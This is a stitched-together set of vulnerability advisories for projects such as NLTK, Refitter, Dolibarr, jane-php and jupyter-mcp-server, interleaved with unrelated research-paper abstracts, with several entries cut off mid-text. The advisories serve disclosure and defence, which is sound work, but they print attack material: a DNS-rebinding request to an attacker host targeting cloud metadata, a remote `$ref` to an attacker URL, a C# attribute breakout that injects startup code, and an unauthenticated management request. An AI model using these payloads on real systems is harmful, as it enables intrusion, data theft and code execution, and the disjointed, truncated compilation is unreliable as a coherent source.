## Summary
`validate_url_ssrf` resolves the hostname, checks the IP against private ranges, then **discards the IP and returns the hostname URL string**. aiohttp performs a fresh, independent DNS resolution at connect time. An attacker controlling DNS for a hostname (TTL 0, alternating public IP and internal IP) passes validation on the first lookup and connects to the internal IP on the second — a classic check-then-use race. SECURITY_SSRF.md line 63 explicitly claims DNS-rebinding is prevented; it is not.

## Root Cause
`src/core/utils.py:523` returns the hostname URL after validation; the resolved IP is never pinned. A repo grep of `http/` and `utils.py` for `TCPConnector` / `resolver` / `response.history` / `on_request_redirect` / IP-pinning returns NONE. Each module builds a fresh `ClientSession` per call → the connect-time `getaddrinfo` is independent of the validation-time lookup.

## Impact
Defeats the SSRF guard on ALL modules that call it (readable internal fetch). Independent of IP-range completeness — the private IP is never presented to `is_private_ip`. Requires attacker DNS control + winning the resolution race → AC:H.

## Proof of Concept
Code-proven: `validate_url_ssrf` returns the hostname (utils.py:523); no pinned-IP connector anywhere. Two independent resolutions occur (validation-time and aiohttp connect-time).
```
attacker DNS: rebind.attacker.tld TTL 0, alternating public IP and the cloud metadata IP
execute_module http.get {"url":"http://rebind.attacker.tld/latest/meta-data/..."}
```

## Attack Chain
1. Entry: `http.get {url:"http://rebind.attacker.tld/..."}`. Guard: `validate_url_with_env_config`. Bypass proof: `getaddrinfo(rebind.attacker.tld)` returns the public IP, `is_private_ip=False` (utils.py:511-519); returns the hostname URL (:523) — the IP is discarded.
2. Sink: `session.get("http://rebind.attacker.tld/...")` (get.py:116). aiohttp performs a FRESH independent `getaddrinfo` at connect → now resolves to the internal IP. Bypass proof: no `TCPConnector`/`AsyncResolver`/pinned-IP in `http/` (grep confirms none). Two lookups.
3. Impact: internal fetch, body returned.

## Bypass Evidence
`utils.py:523` returns the hostname string, not a pinned IP; grep confirms no IP pinning or custom resolver anywhere on the path; fresh `ClientSession` per call guarantees an independent second resolution.

## Affected Versions
`<= 2.26.6` — `utils.py:523` present on latest release tag; no pinning added on HEAD.

## Suggested Fix
Resolve the hostname once, pin the validated IP, and connect to that IP (custom `TCPConnector`/resolver) — reject any connect-time resolution that differs. This is the fix SECURITY_SSRF.md already claims is in place.

## Credit

Vulnerability discovered by zx (Jace).

items.summary:
### Summary
jane-php resolves external `$ref` targets at code-generation time via `file_get_contents($ref)` (jane-php/json-schema-runtime/Reference.php::doResolve) with no scheme/path restriction. An attacker-controlled OpenAPI document can therefore cause: `$ref: 'http://attacker/x'` -> SSRF (HTTP GET at gen time; response inlined = RFI); `$ref: '/abs/file'` -> LFI; `$ref: '../secret.yaml'` -> path-traversal LFI (CWE-22, arbitrary local JSON/YAML read). Verified 7.11.2/PHP8.1 (listener records the fetch; remote + `../` local content inlined into the generated code). `file://` rejected. CWE-918/CWE-98/CWE-611/CWE-22.

### Details
```php
// Reference.php::doResolve()
$contents = file_get_contents($fragment); // $fragment = attacker-controlled $ref URI
```

### Impact
Generating PHP with jane from an attacker-influenced OpenAPI document issues HTTP requests to attacker-chosen URLs (SSRF — internal services, cloud metadata) and reads arbitrary local files (LFI via `../`), at build/CI time, inlining results into the output.

### PoC
`reproduce.sh` (+ `make_spec.py`, `gen.php`): runs jane on a remote-$ref spec (local listener records the SSRF, output checked for the inlined response) and a `../`-traversal local-$ref spec (output checked for the leaked file).

### Suggested fix
Disable remote `$ref` fetching by default (or allow-list); confine local `$ref` to the spec directory (reject absolute paths and `..`). Don't `file_get_contents($ref)` on attacker-controlled URIs.

## Summary

Four hypernym-walking methods on the WordNet `Synset` class in `nltk/corpus/reader/wordnet.py` (`max_depth`, `min_depth`, `hypernym_paths`, and `hypernym_distances`) traverse the hypernym pointer graph by direct recursion with no visited-node set and no depth cap. WordNet `data.<pos>` file content is untrusted corpus input in NLTK, the same trust boundary the project already treats as attacker-controlled across its corpus-content hardening work. When the parsed hypernym graph contains a cycle, or a chain deeper than the interpreter recursion limit, these methods recurse without bound and raise an uncaught `RecursionError`, aborting the traversal and any worker that does not catch it. No special privileges are needed; the victim only has to load an attacker-supplied corpus and call any of several shipped public methods that reach these walkers.

## Root Cause

`Synset.max_depth` computes `1 + max(h.max_depth() for h in hypernyms)` and only assigns its `_max_depth` memo after that recursive expression fully returns. Because Python evaluates the right-hand side completely before binding the left-hand side, the memo is never set on a node that is still on the recursion stack, so a cyclic graph re-enters the same not-yet-memoized node indefinitely. `min_depth`, `hypernym_paths`, and `hypernym_distances` follow the same recursive descent with no cycle detection. The security invariant that graph traversal over untrusted corpus data must terminate is violated: the pointer offsets parsed from the data file are stored verbatim with no graph-shape validation, so the attacker controls the graph topology. The sibling walkers in the same class (`closure`, `tree`, `_shortest_hypernym_paths`) were hardened with acyclic/visited guards, which shows cyclic hypernym graphs are an in-scope threat that these four methods simply were not converted to handle.

```text
Affected functions in nltk/corpus/reader/wordnet.py:
  Synset.max_depth          (nltk/corpus/reader/wordnet.py:550)
  Synset.min_depth          (nltk/corpus/reader/wordnet.py:564)
  Synset.hypernym_paths     (nltk/corpus/reader/wordnet.py:666)
  Synset.hypernym_distances (nltk/corpus/reader/wordnet.py:768)
Untrusted pointer stored at nltk/corpus/reader/wordnet.py:1694
Re-entry edge: hypernyms() (:138) -> _related('@') (:1103) -> synset_from_pos_and_offset (:1104)
```

## Impact

An attacker who can supply a WordNet `data.<pos>` corpus file that the victim loads (for example a downloaded, mirrored, or user-provided WordNet corpus) can construct a hypernym pointer graph that is cyclic or deeper than the recursion limit. When the application then calls any hypernym-depth or path method, the walker recurses without bound and raises an uncaught `RecursionError`, terminating the current traversal and any request or worker process that does not handle it. Under a raised or removed recursion limit, unbounded recursion can instead exhaust the native stack and abort the process. The impact is availability only; there is no confidentiality or integrity effect. Reachable public entry points include `hypernym_paths` and `hypernym_distances` directly, and `max_depth`/`min_depth` indirectly through `lowest_common_hypernyms`, `wup_similarity`, `path_similarity`, and `lch_similarity`.

## Proof of Concept

`Requires only the nltk package under test on PYTHONPATH; no network or WordNet data download. The reader is instantiated with __new__ to skip unrelated OMW/lexname loading, the same technique NLTK's own recursion-DoS hardening test uses; the parser and the walker under test are unmodified library code.`

1. Build a `WordNetCorpusReader` without its unrelated data-loading side effects.
2. Parse two synset records whose `@` (hypernym) pointers reference each other, forming a 2-cycle.
3. Call `Synset.max_depth()` on one of them.

```python
import sys
sys.setrecursionlimit(1500)
from nltk.corpus.reader.wordnet import WordNetCorpusReader

reader = WordNetCorpusReader.__new__(WordNetCorpusRea

items.summary: In Dolibarr before 24.0.3, dolForgeSQLCriteriaCallback() in htdocs/core/lib/functions.lib.php allows account takeover because it strips only a single table-name prefix from a Universal Search Filter (sqlfilters) operand before checking it against the forbidden-field denylist (pass, pass_crypted, api_key). MariaDB and MySQL accept a two-level qualification such as schema.alias.column, so an operand of the form dolibarr.u.pass_crypted survives the check and is emitted into the WHERE clause. A remote authenticated user holding only the holiday read and readall permissions, which confer no user-management or administrative access, can use the resulting boolean oracle at GET /api/index.php/holidays to recover any user's bcrypt password hash and api_key one character at a time, including an administrator's. Because api_key is accepted directly by the REST API as a bearer credential, this yields full administrative control of the application. This bypasses the fix for CVE-2026-89012, which added only a strtolower() call and did not address prefix depth. The same denylist also omits pass_temp, which stores a password in cleartext, as well as national_registration_number, salary, birth, address, personal_mobile and note_private.

items.summary:
### Summary

Refitter emits the spec's content-type key (content map key in requestBody/responses) verbatim into a Refit `[Headers("Accept: <ct>", "Content-Type: <ct>")]` attribute string without escaping
`"`. A crafted value survives Refitter's default OpenAPI validation, breaks out of the attribute and
the enclosing interface + namespace, injects a top-level `file class` with a `[ModuleInitializer]`
method, and reopens so the file stays valid. .NET runs `[ModuleInitializer]` methods at assembly
load, so the attacker's code executes at application startup. Verified on Refitter 2.0.0 / .NET 8.

The malicious input is a content-type KEY such as: content: { 'application/<breakout>': {schema} }.
No `--skip-validation` is required.

### PoC

`reproduce.sh` (+ `make_spec.py`) attached: generates with default validation, compiles into a
console app, runs it (Main does not touch the client), and shows a marker written at assembly load.

### Impact

Code execution at assembly load (process startup) in any application that compiles a Refitter client
generated from an attacker-controlled or attacker-influenced OpenAPI description. Estimated Critical, e.g.
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (the CNA sets the final score).

### Suggested fix

Escape every spec-derived string before emitting it into a Refit attribute (escape `"`, `\`,
reject newlines) and validate characters. We recommend auditing all attribute emissions that embed
spec-derived values, using one shared encoder.
[reproduce.sh](https://github.com/user-attachments/files/29394848/reproduce.sh)
[maintainer-report.txt](https://github.com/user-attachments/files/29394851/maintainer-report.txt)
[make_spec.py](https://github.com/user-attachments/files/29394853/make_spec.py)

items.summary:
### Summary

Refitter emits each OpenAPI path (the paths-object key) verbatim into a Refit `[Get("<path>")]`
attribute string, without escaping `"` or restricting characters. A crafted single-line, /-prefixed
path survives Refitter's default OpenAPI validation yet closes the attribute string and the enclosing
interface + namespace, injects a top-level `file class` with a `[ModuleInitializer]` method, and
reopens a namespace + interface so the file stays valid. .NET runs `[ModuleInitializer]` methods when
the generated assembly is loaded, so the attacker's code executes at application startup. Verified on
Refitter 2.0.0 / .NET 8.

### Details

```
[Get("/p")] Task<string> Dummy(); } }
file class Evil { [System.Runtime.CompilerServices.ModuleInitializer]
  internal static void Init(){ /* attacker code */ } }
namespace N2 { public partial interface I2 { [Get("/q")]
        Task<string> GetU(string id);
    }
}
```

No `--skip-validation` is needed (the payload is a valid single-line path). The generated `.cs` is
compiled into the victim application; the module initializer runs at assembly load. This is distinct
from the value sinks (enum/default), which are escaped; the path sink has no escaping. The
`[Header("<name>")]` attribute is likewise emitted raw (header parameter names), at minimum a
build-breaking DoS.

### PoC

`reproduce.sh` (+ `make_spec.py`) attached: generates with default validation, compiles into a console
app, runs it (Main does not touch the client), and shows a marker written at assembly load. Verified
on 2.0.0.

### Impact

Code execution at assembly load (process startup) in any application that compiles a Refitter client
generated from an attacker-controlled or attacker-influenced OpenAPI description.

### Suggested fix

Escape the route template before emitting it into `[Get("…")]` (escape `"`, `\`, reject newlines) and
validate that paths contain only legal URI-template characters. Apply the same encoding to
`[Header(…)]`, `[Post/Put/Delete(…)]`, and every attribute that embeds a spec-derived string.
[maintainer-report.txt](https://github.com/user-attachments/files/29395228/maintainer-report.txt)
[make_spec.py](https://github.com/user-attachments/files/29395229/make_spec.py)
[reproduce.sh](https://github.com/user-attachments/files/29395230/reproduce.sh)

items.summary:
### Summary
The Halo 2 aggregation circuit could mishandle proof elements encoded as the point at infinity.

When an assigned proof point appeared in an MSM term with constant scalar one, the Halo 2 loader used a scalar-one shortcut that passed the assigned point directly into the EC sum helper. The EC sum implementation used by that path assumed its inputs were non-identity points, while assigned proof points could represent the encoded identity `(0, 0)`.

### Details
`EcPointLoader::multi_scalar_multiplication` partitions MSM terms by scalar and base type. For `(Value::Constant(ONE), Value::Assigned(_))`, the loader placed the assigned base into the non-scaled variable-base list and later passed those points to `sum_with_const`.

The default Halo 2 shim delegates `sum_with_const` to halo2-lib `EccChip::sum`. In affected versions, that sum helper used incomplete affine addition and assumed that every input point was non-identity. A prover-controlled proof point encoded as `(0, 0)` could therefore enter the final aggregation sum through the scalar-one shortcut and affect the MSM or accumulator computation.

The issue was fixed in halo2-lib by updating `EccChip::sum` to treat encoded identity inputs as no-ops and to return `(0, 0)` when the total sum is the identity. This removes the non-identity input precondition from callers such as the Halo 2 aggregation loader.

### Impact
Recursive aggregation circuits using the Halo 2 loader could compute an MSM or accumulator with an identity proof element in a path whose implementation assumed non-identity inputs. This breaks the expected handling of point-at-infinity proof elements in aggregation.

Practical exploitability depends on the surrounding aggregation and final-decider checks, so this is rated medium severity.
items.title: snark-verifier: Halo 2 aggregation circuit mishandles point-at-infinity proof elements

items.summary: As multimodal large language models (MLLMs) become increasingly integrated into everyday life, their ability to provide safe and reliable assistance in realistic daily activities remains insufficiently explored. Existing safety benchmarks primarily focus on isolated harmful requests or adversarial scenarios, overlooking the safety risks that may arise as ordinary tasks unfold. In practice, users pursue legitimate goals through multi-turn, multimodal interactions, where seemingly benign requests may become safety-critical when considered alongside earlier actions and visual observations. This calls for Dynamic Safety Awareness, the ability to track evolving task conditions, recognize implicit contextual risks, and provide safe and helpful assistance. To systematically evaluate this capability, we introduce DailySafe, a benchmark comprising 195 naturalistic multi-turn, multi-image interactions across 10 everyday domains and 42 task categories. Grounded in authentic user dialogue topics and documented safety knowledge, DailySafe captures realistic scenarios where safety-critical evidence is progressively revealed across conversational turns and visual observations. Using case-specific safety annotations, DailySafe assesses whether MLLMs can recognize and appropriately address evolving risks while supporting users' legitimate goals, bringing multimodal safety evaluation closer to real-world everyday AI assistance. DailySafe is publicly available at: https://github.com/XuankunRong/DailySafe.
items.title: DailySafe: Benchmarking Dynamic Safety Awareness in Everyday Multi-Turn Multimodal Interactions

items.summary: Penetration testing in Internet of Things (IoT) environments, especially those composed of various different devices, e.g., smart plugs, smart cameras, and smart doors, presents great challenges across the phases of information gathering, attack surface enumeration, privilege escalation, and lateral movement. This paper introduces ALIoTh, a multi-agent, workflow-driven penetration testing framework that integrates Large Language Models agents within a Self-Retrieval-Augmented Generation (Self-RAG) architecture to autonomously identify and exploit vulnerabilities in IoT and Industrial-IoT (IIoT) environments. By leveraging state-of-the-art language models and orchestrating specialized agents via the LangGraph framework, ALIoTh dynamically plans and executes a full-spectrum offensive pipeline. This includes network, devices, and service enumeration, vulnerability assessment, payload generation, reverse shell deployment, and privilege escalation on each device. The Self-RAG mechanism equips expert agents with contextual access to IoT security knowledge, e.g., related documentation, tool manuals, and known attack techniques, enhancing their reasoning capabilities in scenarios involving multiple device exploitation and group policy manipulation.
items.title: ALIoTh: Orchestrating Multi-Agent LLMs for Autonomous IoT Penetration Testing

items.summary: A quantum computer running Shor's algorithm can extract the private key of every Ethereum account whose public key is published, and accounts exposed by their own transactions hold 54.6% of execution-layer ETH. As the first such machine may stay secret, a migration cannot wait for visible thefts, and once keys are extractable, legacy signatures no longer tell owners from attackers. We design a migration in which owners enroll post-quantum keys cheaply with their existing signatures before ECDSA is retired at a scheduled time, while a zero-knowledge proof of the wallet's BIP-39 seed can correct any such enrollment until a common deadline afterward; an account nobody enrolled stays frozen and recoverable by seed proof without a deadline. Each proof binds the new key, a nonce and a fee cap, so neither a paying sponsor nor a reordering block builder can redirect or replay it. Validators switch to hash-based keys first, at a finalized checkpoint and under a stated bound on the attacker's voting power. We prove the account guarantees under explicit assumptions, model-check the rules, and implement the design in go-ethereum and a Lean consensus client. A three-layer recursive hash-based STARK yields a seed proof of about 190 KB that fits one transaction, verifies in 38 ms and takes a median of 111 s to generate on a laptop; four proofs aggregate into one. In a ten-node simulation with mainnet-derived accounts and fee demand, block space rather than proving sets the duration: the 4.45 million accounts with at least 0.1 ETH would migrate in 29.4 days if all enroll before ECDSA is retired and in 235 days if all recover after it in batches of four. In a mass enrollment, an enrollment waits a median of 19.1 minutes in the public mempool, longer than published estimates for a fast quantum computer to extract its key, so owners with a seed and an unexposed key should migrate by seed proof.
items.title: Correctable Enrollment and One-Transaction Seed Proofs for Ethereum's Post-Quantum Transition

items.summary: High-impact attacks on PHP web applications often chain limited-capability vulnerabilities with other flaws or intended behaviors. Discovering these chains requires identifying flaws and the dependencies enabling capability composition. Existing vulnerability discovery techniques analyze flaws in isolation, while attack planning assumes known components. This separation makes it difficult to discover previously unknown components whose security relevance becomes apparent only through their potential roles in an exploit chain. We present ChainAgent, a goal-directed LLM-agent framework that jointly discovers exploit-chain components and their capability dependencies in source code. Guided by an empirical study of 386 real-world web exploit chains, ChainAgent represents vulnerabilities and functional gadgets--intended program behaviors that can be repurposed in attacks--through preconditions and capabilities over security-relevant objects. Instead of discovering vulnerabilities first and constructing attack paths afterward, ChainAgent uses an evolving exploit graph to guide source-code inspection. It searches backward from unmet preconditions for capability producers and forward from discovered capabilities for functional gadgets that consume or amplify them. Object-centered chaining knowledge from our empirical study directs searches toward promising vulnerability classes, functional operations, and object accesses. We evaluate ChainAgent against Codex, a general-purpose coding agent, on 15 PHP applications across three shared LLM backends. ChainAgent achieves 42.02%--44.63% recall for goal-reaching components and recovers up to 4.4 times as many correct goal-reaching dependency edges as Codex. An additional evaluation of 30 real-world PHP applications identifies 20 vulnerabilities and 13 exploit chains, nine of which achieve remote code execution (RCE).
items.title: ChainAgent: Automated Chainable Vulnerability Discovery in PHP Web Applications

items.summary: Large language models (LLMs) are increasingly used in investment research, and many studies report promising historical returns. However, such results are only credible if researchers can demonstrate that the model used only information available at the time, account for how strategies and configurations were selected, and explain how reported returns were generated. We identify six common threats to validity in LLM investment evaluations and apply them to 18 published studies. Across 108 assessments, we find substantial gaps in reporting. No paper fully addresses information timing, model-memory exposure, universe selection, trading costs, or configuration-selection bias. Only four studies provide minimum evidence that results hold across multiple market periods. Our analysis reveals that commonly used safeguards often address different problems than researchers assume. For example, using dated inputs does not guarantee that a pretrained model lacked knowledge of future events, and repeated experimental runs do not correct for strategy-selection bias. We therefore propose an evaluation protocol for future LLM investment research. Rather than judging whether LLMs can generate profits, our study examines whether existing evidence is sufficient to support such claims. We conclude that current reporting practices are generally insufficient for that purpose.
items.title: Evaluating LIM Trading Agents: A Critical Review of Backtesting Validity and Reporting Practices

items.summary: Mixture-of-Experts (MoE) architectures enable high-capacity large language models (LLMs) with high sparse computation, making them attractive for deployment on private hardware. However, distributing model weights exposes valuable intellectual property (IP) to leakage and unauthorized redistribution, creating an urgent need to both verify model ownership and trace leaked copies to individual licensees. Existing model-watermarking techniques are ill-suited for meeting this need because they are fragile under MoE's dynamic routing or require costly retraining to embed a distinct watermark for each licensee, thus making scalable distribution difficult. To address these challenges, we present PPMoE, the first plug-and-play multi-licensee watermarking framework for MoE LLMs. Rather than training a separate model per user, PPMoE trains a compact set of mergeable incremental weight modules that steer the MoE router toward distinct, mutually compatible routing patterns. During model distribution, the model owner selectively merges unique combinations of these pre-trained, mutually compatible modules into the base model on the fly, embedding a licensee-specific watermark without additional training. PPMoE supports reliable multi-licensee attribution under both white- and black-box threat models. In the white-box setting, attribution is done by inspecting triggered routing decisions or the merged weight modules responsible for these decisions, whereas in the black-box setting, attribution relies on analyzing output token likelihood ratios. Extensive experiments across five state-of-the-art MoE models, seven benchmark datasets, and varying number of licensees show that PPMoE achieves very high attribution accuracy while preserving base model utility and maintaining strong robustness to various adaptive watermark-removal attacks.
items.title: Plug-and-Play Multi-Licensee Robust Watermarking for Mixture-of-Experts LLMs

items.summary:
A crafted PNG can make `imagemeta.Decode` allocate memory far in excess of the input file's size, leading to memory exhaustion. Two separate paths in the `zTXt` "Raw profile type iptc" branch are affected: the declared chunk length drives an allocation directly, and the embedded zlib stream is decompressed without an output bound. A 42-byte file allocated 256 MB, and a 127 KB file allocated 460 MB.

### Impact

Denial of service by memory exhaustion against any application that decodes untrusted PNG images with this library. The decompression bomb is the more reliable vector, since it produces genuinely resident memory; the effect of the oversized `make` depends on the platform's overcommit behavior and any configured `GOMEMLIMIT` or cgroup limit.

### Patches

Fixed in v0.17.3. 

### Workarounds

Reject or bound PNG input size before calling `Decode`, or clear `IPTC` from `Options.Sources` if IPTC metadata is not required.

### Credits

Reported by Arpit Jain ([@arpitjain099](https://github.com/arpitjain099)).

items.summary:
Standalone `streamable-http` mode in `datalayer/jupyter-mcp-server` requires `MCP_TOKEN` for `/mcp`, but the custom management routes mounted on the same application do not enforce that token. An unauthenticated network caller can invoke `PUT /api/connect`, choose the Jupyter backend URL and token fields, reset the server context, and make the MCP server start a kernel client against attacker-controlled infrastructure. The same missing authentication affects the state-changing `DELETE /api/stop` route.

The intended authentication boundary is documented in the security guide and enforced during startup:

```text
docs/docs/reference/security/index.mdx:15
All MCP endpoints require Bearer token authentication.

docs/docs/reference/security/index.mdx:25
Starting with version 1.0.0, MCP client authentication is required for the streamable-http transport.
```

The CLI enforces that boundary for the MCP endpoint:

```python
# jupyter_mcp_server/CLI.py:203-209
if transport == "streamable-http" and not mcp_token and not insecure_mcp_noauth:
    raise click.UsageError(
        "streamable-http transport requires MCP client authentication. "
        "Set --mcp-token / MCP_TOKEN, or pass --insecure-mcp-noauth to "
        "explicitly allow unauthenticated access."
    )
```

```python
# jupyter_mcp_server/CLI.py:285-290
if transport == "streamable-http":
    if mcp_token:
        from jupyter_mcp_server.server import RuntimeTokenVerifier
        mcp._token_verifier = RuntimeTokenVerifier(mcp_token)
        logger.info("MCP endpoint token authentication enabled (using MCP_TOKEN)")
```

The vulnerable route is `jupyter_mcp_server/server.py:143-187`:

```python
@mcp.custom_route("/api/connect", ["PUT"])
async def connect(request: Request):
    data = await request.json()

    document_runtime = DocumentRuntime(**data)

    set_config(
        provider=document_runtime.provider,
        runtime_url=document_runtime.runtime_url,
        runtime_id=document_runtime.runtime_id,
        runtime_token=document_runtime.runtime_token,
        document_url=document_runtime.document_url,
        document_id=document_runtime.document_id,
        document_token=document_runtime.document_token,
        allowed_jupyter_tools=document_runtime.allowed_jupyter_tools or "notebook_run-all-cells,notebook_get-selected-cell"
    )

    ServerContext.reset()

    try:
        __start_kernel()
        return JSONResponse({"success": True})
```

`/api/stop` is also unauthenticated and state-changing:

```python
# jupyter_mcp_server/server.py:190-199
@mcp.custom_route("/api/stop", ["DELETE"])
async def stop(request: Request):
    try:
        current_notebook = notebook_manager.get_current_notebook() or "default"
        if current_notebook in notebook_manager:
            notebook_manager.remove_notebook(current_notebook)
        return JSONResponse({"success": True})
```

## Proof of concept

Run the affected version:

```bash
git clone https://github.com/datalayer/jupyter-mcp-server
cd jupyter-mcp-server
git checkout 27b91e551d8bbca2da32c334f9f13267290ff815
python3.12 -m venv .venv
. .venv/bin/activate
python -m pip install -e .
MCP_TOKEN=SCAN_MCP_TOKEN python -m jupyter_mcp_server \
  --transport streamable-http \
  --start-new-runtime false \
  --jupyterlab false \
  --mcp-token SCAN_MCP_TOKEN \
  --port 8083
```

Send a request to the protected MCP endpoint without credentials:

```http
POST /mcp HTTP/1.1
Host: 127.0.0.1:8083
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}
```

Observed response:

```http
HTTP/1.1 401 Unauthorized
www-authenticate: Bearer error="invalid_token", error_description="Authentication required"
```

Now send the unauthenticated management request:

```http
PUT /api/connect HTTP/1.1
Host: 127.0.0.1:8083
Content-Type: application/json

{
  "provider": "jupyter",
  "runtime_url": "http://127.0.0.1:9183",
  "runtime_id": "",
  "runtime_token": "ATTACKER

items.summary:
## Summary

NLTK ships a security wrapper, `nltk.pathsec.ZipFile`, that is meant to confine archive extraction to trusted data roots and to block link-based escapes. When `nltk.download()` installs a package, the extraction write opens each member's target path without checking whether that path is a hardlink to a file located outside the data root. A local actor who can write inside a shared or predictable NLTK data root (for example `~/nltk_data`, a group-writable `/usr/share/nltk_data`, or a shared container volume) can pre-plant an in-root hardlink at a member path that a soon-to-be-installed package will write. When the victim later runs the download, extraction truncates and overwrites the outside-root target through that hardlink. This is the same weakness class as the previously fixed downloader hardlink issue, but the fix did not reach the package-extraction write sink, so the latest published release remains exploitable through this path.

## Root Cause

The prior fix added an `st_nlink > 1` refusal to the file-open helpers (`nltk.pathsec.open` / `_hardened_open`) and routed the downloader temporary-file write through that hardened opener, so a multiply-linked inode is refused on those paths. The extraction write sink was never given the same check. On published releases, `nltk.pathsec.ZipFile.extract` validates member names with `validate_zip_archive` and then delegates to the standard library extractor, whose plain `open(targetpath, "wb")` opens and truncates a pre-existing hardlink. The containment guard `validate_zip_archive` relies on `Path.resolve()` and name checks; `resolve()` follows symlinks (so a symlinked member is correctly refused) but a hardlink has a legitimate in-root name and in-root resolved path, so it passes. No code on the extraction path performs the `st_nlink` fstat that the sibling open helper performs.

```text
Affected component: nltk.pathsec (archive extraction), driven by nltk.downloader
Released sink (<= 3.10.3): nltk/pathsec.py ZipFile.extract -> stdlib zipfile._extract_member -> open(targetpath, "wb")
Containment guard that fails open for hardlinks: nltk/pathsec.py validate_zip_archive (name checks + Path.resolve())
Development-branch sink: nltk/pathsec.py ZipFile._extract_member leaf reopen with O_WRONLY|O_TRUNC|O_NOFOLLOW (no st_nlink fstat)
```

## Impact

An unprivileged local user who can create a file inside a data root that the victim's NLTK installation will extract into can cause the victim's process to truncate and overwrite a file outside that root. The attacker chooses which outside file is destroyed by selecting the hardlink target, so the integrity impact is complete for the chosen path (arbitrary outside-root file destruction). Where the victim resolves packages through an attacker-influenced mirror or index, the overwritten bytes are also attacker-chosen, which plausibly enables targeted file replacement and later code execution if the victim subsequently consumes the replaced file; that escalation is plausible rather than demonstrated here. Practical exploitation requires either that kernel hardlink protection (`fs.protected_hardlinks`) is disabled, or that the outside target is one the planting actor is permitted to hardlink (owned, writable, or group-shared), which is the same precondition carried by the previously accepted advisory for this weakness class.

## Proof of Concept

`Dependencies: a released nltk (3.10.3) installed from PyPI. The demonstration creates a data root, a victim file outside it, and a package archive whose member path is pre-planted as a hardlink to the victim file, then extracts through the security wrapper. It runs as a single user and succeeds even with fs.protected_hardlinks=1.`

Steps:
1. Register a data root with `nltk.data.path` and create an extraction subtree inside it.
2. Create a victim file outside the data root.
3. Pre-plant an in-root hardlink at the member path the archive will write.
4. Extract the archive through `nltk.pathsec

> **affected**: PyPI `nltk` `>= 3.6` — `nltk.corpus.reader.xmldocs.XMLCorpusView` streaming read (and the `nps_chat` / `framenet` readers built on it)
> **dynamically reproduced**: `3.6` (6/6 checks), `3.9.2` (6/6), `3.10.3` (6/6) and `develop` `6818767b9` (6/6)

---

_Source references (`nltk/corpus/reader/xmldocs.py:NNN`) are to commit `6818767b99c24659107eb2be9bccd32a3d4bf045` (`develop`, `v3.10.3-15-g6818767b9`). The released `v3.10.3` wheel's `xmldocs.py` is byte-identical to that commit, so the same line numbers apply to the released wheel._

### Summary

**An attacker who can make a victim read a well-formed XML corpus file whose body contains one large comment or CDATA section can pin a CPU core for a time quadratic in the file size, because `XMLCorpusView._read_xml_fragment` (`nltk/corpus/reader/xmldocs.py`) re-runs a linear whole-buffer validation after every 1 KiB block while the comment/CDATA terminator is still ahead.** `XMLCorpusView` is NLTK's documented streaming API for XML corpora and is instantiated directly by the `NPSChatCorpusReader` and `FramenetCorpusReader` readers; the module header (`xmldocs.py:16-20`) explicitly handles untrusted corpus XML. The `in_tag` guard added to this function for GHSA-vp2x covers only a single oversized `<...>` tag and leaves the CDATA/comment path quadratic in the current release.

### Details

Root cause: `_read_xml_fragment` (`xmldocs.py:273-338`) accumulates the file into one `fragment` string in `_BLOCK_SIZE` (1024) character chunks (`xmldocs.py:123, 298-299`). After every block that is not yet a well-formed prefix, the fragment is re-validated against `_VALID_XML_RE`. Two whole-buffer operations dominate:

```python
# xmldocs.py:308
if not in_tag and self._VALID_XML_RE.match(fragment):      # whole-buffer match (O(len))
    return fragment
# xmldocs.py:312
if re.search("[<>]", fragment).group(0) == ">":            # O(1) for this input class:
    ...                                                     # the document starts with '<'
# xmldocs.py:329
if self._VALID_XML_RE.match(fragment[:last_open_bracket]): # whole-buffer prefix match (O(len))
    ...
```

For this input class the `re.search` probe at `xmldocs.py:312` is O(1): the fragment always starts with `<` (e.g. `<root>…`), so the first `<`/`>` character is at offset 0 and it never contributes cost. The quadratic cost comes entirely from the two whole-buffer regex matches at `xmldocs.py:308` and `xmldocs.py:329` (the latter scans the buffer up to the most recent `<`, which for this input sits near the end of the buffer).

`_VALID_XML_RE` (`xmldocs.py:238-249`) is a *linear* regex (its tempered-dot comment/CDATA bodies `(?:(?!-->).)*` / `(?:(?!\]\]>).)*` scan left-to-right in O(length) — confirmed by the embedded script's single-match check), but for a fragment whose terminator is far ahead the *match itself fails after scanning the whole buffer*. With an unclosed-across-blocks CDATA or comment, **every one of the n/1024 blocks** pays O(current buffer length) on lines 308 and 329, for a total of ~O(n²) character operations.

The `in_tag` guard added for GHSA-vp2x (`xmldocs.py:283-305`) tracks only bare `<`/`>` characters: it is `True` inside an unclosed `<...>` tag and, in that state, skips only the line-308 match. It never represents "the fragment sits inside an unclosed CDATA or comment" — XML allows arbitrary `<`/`>` inside those constructs — so both the line-308 match and the line-329 backtrack match still fire on every block for a CDATA/comment fragment. The comment block at `xmldocs.py:283-289` even documents the intended linearity contract ("re-running it on every 1 KiB block otherwise makes a single oversized tag O(n^2) (CWE-407)"); the guard implements it for the tag branch only.

The single-match cost is linear, not super-linear: the embedded script measures `_VALID_XML_RE.match()` on 512 KiB → 1 MiB → 2 MiB unclosed-CDATA buffers and gets ≈ 0.074 s → 0.142 s → 0.280 s (≈ 1:1.9:3.8, i.e. linear), asserting
